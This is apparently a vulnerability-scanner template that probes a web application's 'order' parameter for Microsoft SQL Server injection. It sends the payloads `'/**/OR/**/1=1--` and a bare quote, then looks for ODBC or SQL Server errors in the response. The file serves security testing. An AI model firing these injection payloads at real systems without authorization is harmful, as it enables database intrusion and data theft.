id: sqli6-mssql-24
name: 'SQLi mssql probe in order'
severity: high
type: active
tags:
  - sqli
  - injection
  - mssql
description: 'Triggers mssql error via order'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      order:
        - '''/**/OR/**/1=1--'
        - ''''
    matchers:
      - type: regex
        part: body
        regex:
          - 'ODBC'
          - 'SQL Server'
